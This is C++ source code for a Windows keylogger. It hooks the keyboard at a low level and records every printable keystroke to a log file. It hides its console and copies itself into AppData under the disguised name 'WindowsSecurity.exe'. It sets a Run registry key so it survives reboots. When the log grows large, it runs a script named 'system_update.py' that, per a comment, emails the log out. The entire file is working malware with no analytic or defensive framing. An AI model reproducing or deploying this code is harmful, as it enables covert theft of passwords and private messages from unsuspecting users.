#include <windows.h>
#include <iostream>
#include <fstream>
#include <unordered_set>
#include <string>
#include <sstream>

using namespace std;

const string LOG_FILE = "log.txt";
const int LOG_SIZE_LIMIT = 5000;  // Send email when log reaches this size

ofstream logFile(LOG_FILE, ios::app);
unordered_set<int> pressedKeys;

bool isPrintableChar(int key) {
    return (key >= 32 && key <= 126);
}

void checkAndSendLog() {
    ifstream inFile(LOG_FILE, ios::ate);
    if (inFile.is_open()) {
        streamsize size = inFile.tellg();
        inFile.close();
        
        if (size >= LOG_SIZE_LIMIT) {
            logFile.close();  // Close the file before sending
            
            // Run Python script to send email
            system("python system_update.py");
            
            // Clear the log file after sending
            logFile.open(LOG_FILE, ios::trunc);
        }
    }
}

void persistKeylogger() {
    char path[MAX_PATH];
    GetModuleFileName(NULL, path, MAX_PATH);  // Get current EXE path
    
    string destPath = string(getenv("APPDATA")) + "\\WindowsSecurity.exe";
    
    // Copy the EXE to a hidden location
    CopyFile(path, destPath.c_str(), FALSE);

    // Add registry key for persistence
    HKEY hKey;
    RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
    RegSetValueEx(hKey, "WindowsSecurity", 0, REG_SZ, (BYTE*)destPath.c_str(), destPath.size() + 1);
    RegCloseKey(hKey);
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        KBDLLHOOKSTRUCT *kbdStruct = (KBDLLHOOKSTRUCT *)lParam;
        int key = kbdStruct->vkCode;

        if (wParam == WM_KEYDOWN && pressedKeys.find(key) == pressedKeys.end()) {
            pressedKeys.insert(key);
            
            if (isPrintableChar(key)) {
                logFile.put(static_cast<char>(key));
            } else if (key == VK_RETURN) {
                logFile.put('\n');
            } else if (key == VK_SPACE) {
                logFile.put(' ');
            }
            logFile.flush();
            checkAndSendLog();
        } else if (wParam == WM_KEYUP) {
            pressedKeys.erase(key);
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    FreeConsole();  // Hide the console window
    persistKeylogger();  // Make it persistent
    
    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (!keyboardHook) {
        cerr << "Failed to install hook!" << endl;
        return 1;
    }
    
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    UnhookWindowsHookEx(keyboardHook);
    return 0;
}
